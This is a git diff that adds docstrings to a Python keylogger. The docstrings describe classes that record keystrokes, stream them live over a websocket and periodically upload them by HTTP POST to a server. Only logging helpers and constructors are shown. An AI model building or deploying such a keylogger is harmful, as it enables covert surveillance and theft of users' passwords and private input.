@@ -15,9 +15,14 @@ formatter = logging.Formatter('%(asctime)s : %(message)s')
 
 
 def setup_logger(name, log_file, level=logging.DEBUG):
-    # To setup as many loggers as you want
-    # logger = setup_logger('first_logger', 'first_logfile.log')
-    # logger.info('This is just info message')
+    """To setup as many loggers as you want
+    logger = setup_logger('first_logger', 'first_logfile.log')
+    logger.info('This is just info message')
+    
+    :param name: logger name 
+    :param log_file: log to this file
+    :param level: log level
+    :return: logger object """
 
     handler = logging.FileHandler(log_file)
     handler.setFormatter(formatter)
@@ -30,11 +35,18 @@ def setup_logger(name, log_file, level=logging.DEBUG):
 
 
 def time_stamp():
+    """
+    Return a timestamp string
+    :return: 
+    """
     ts = strftime('%Y-%m-%d_%H:%M:%S')
     return f'{ts}'
 
 
 class Presses:
+    """
+    Que object to hold recorded keystrokes
+    """
     def __init__(self):
         self.http_presses = []
         self.ws_presses = []
@@ -59,6 +71,9 @@ class Presses:
 
 
 class KeyLogger:
+    """
+    Keylogger main logic
+    """
     def __init__(self):
         self.logger = setup_logger('keylogger', 'results.log')
 
@@ -75,6 +90,9 @@ class KeyLogger:
 
 
 class WsStream:
+    """
+    Live key stream over websocket
+    """
     def __init__(self, uri):
         self.uri = uri
         self.logger = setup_logger('WsStream', 'keylogger.log')
@@ -99,6 +117,9 @@ class WsStream:
 
 
 class HttpLogger:
+    """
+    Periodically upload recorded keys via post request to an http server
+    """
     def __init__(self, url):
         self.url = url
         self.logger = setup_logger('HttpLogger', 'keylogger.log')
